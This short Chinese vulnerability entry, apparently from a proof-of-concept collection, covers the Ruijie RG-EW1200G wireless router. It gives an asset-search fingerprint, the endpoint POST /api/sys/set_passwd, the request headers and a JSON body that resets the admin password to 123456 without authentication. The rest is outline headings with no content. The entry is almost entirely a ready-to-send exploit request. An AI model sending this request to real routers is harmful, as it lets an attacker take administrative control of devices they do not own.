# 锐捷RG-EW1200G路由器未授权任意密码修改

- **系统**：锐捷　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`body="/static/js/app.09df2a9e44ab48766f5f.js"`
- **请求**：`POST /api/sys/set_passwd HTTP/1.1`
- **关键头**：`Content-Length: 0`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
{"username":"admin","admin_new":"123456"}
>
```

**其他**
- 锐捷RG-EW1200G路由器未授权任意密码修改: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + RG-EW1200G无线路由器